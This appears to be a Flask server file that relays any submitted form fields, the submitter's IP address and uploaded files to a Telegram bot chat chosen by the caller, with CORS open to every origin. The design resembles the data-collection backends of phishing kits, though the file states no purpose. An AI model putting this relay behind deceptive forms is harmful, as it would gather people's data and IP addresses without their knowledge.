from flask import Flask, request, jsonify
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # ✅ FIX 1: allow cross-origin

TG_API = "https://api.telegram.org/botYOUR_BOT_TOKEN"

@app.route("/send", methods=["POST"])
def send():
    try:
        chat_id = request.form.get("chat_id")

        if not chat_id:
            return jsonify({"error": "chat_id missing"}), 400

        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

        text_lines = [
            "📱 New Submission",
            f"IP Address: {user_ip}",
            ""
        ]

        for key in request.form:
            if key != "chat_id":
                text_lines.append(f"{key}: {request.form.get(key)}")

        # ✅ SEND TEXT
        msg_res = requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": "\n".join(text_lines)
            },
            timeout=15
        )

        if not msg_res.ok:
            print("Telegram message error:", msg_res.text)
            return jsonify({"error": "Failed to send message"}), 500

        sent = 0
        failed = 0

        # ✅ SEND FILES
        for file_key in request.files:
            file = request.files[file_key]

            if file and file.filename:
                try:
                    res = requests.post(
                        f"{TG_API}/sendDocument",
                        data={"chat_id": chat_id},
                        files={"document": (file.filename, file)},  # ✅ FIX 2
                        timeout=60
                    )

                    if res.ok:
                        sent += 1
                    else:
                        print("Telegram file error:", res.text)
                        failed += 1

                except Exception as e:
                    print("File upload error:", str(e))
                    failed += 1

        return jsonify({
            "ok": True,
            "sent": sent,
            "failed": failed
        })

    except Exception as e:
        print("CRASH:", str(e))  # ✅ FIX 3: log everything
        return jsonify({"error": "Server crashed"}), 500


# ✅ FIX 4: Railway requires this
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)